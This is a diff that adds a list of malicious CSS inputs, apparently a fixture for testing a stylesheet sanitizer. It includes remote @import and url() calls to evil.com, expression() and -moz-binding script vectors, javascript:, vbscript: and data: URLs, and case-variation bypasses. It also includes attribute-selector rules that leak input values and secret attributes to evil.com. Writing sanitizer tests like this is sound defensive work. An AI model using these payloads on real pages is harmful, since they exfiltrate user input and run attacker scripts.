@@ -1,0 +1,18 @@
+@import url("https://evil.com/track.css");
+@import "https://evil.com/track.css";
+@import url('https://evil.com/track.css');
+p { width: expression(alert(1)); }
+p { -moz-binding: url("https://evil.com/binding.xml"); }
+p { behavior: url("https://evil.com/evil.htc"); }
+p { background: url("https://evil.com/track.png"); }
+@font-face { src: url("https://evil.com/font.woff"); }
+input[value^="a"] { background: url("https://evil.com/leak?c=a"); }
+input[data-secret^="1"] { background: url("https://evil.com/leak?c=1"); }
+p { background: url("javascript:alert(1)"); }
+p { background: url("vbscript:alert(1)"); }
+p { background: url("data:text/html,<script>alert(1)</script>"); }
+p { background: url("JaVaScRiPt:alert(1)"); }
+@IMPORT url("https://evil.com/x"); /* case variation */
+p { background: URL("https://evil.com/x"); }
+p { width: EXPRESSION(alert(1)); }
+p { bg: url("//evil.com/x"); }
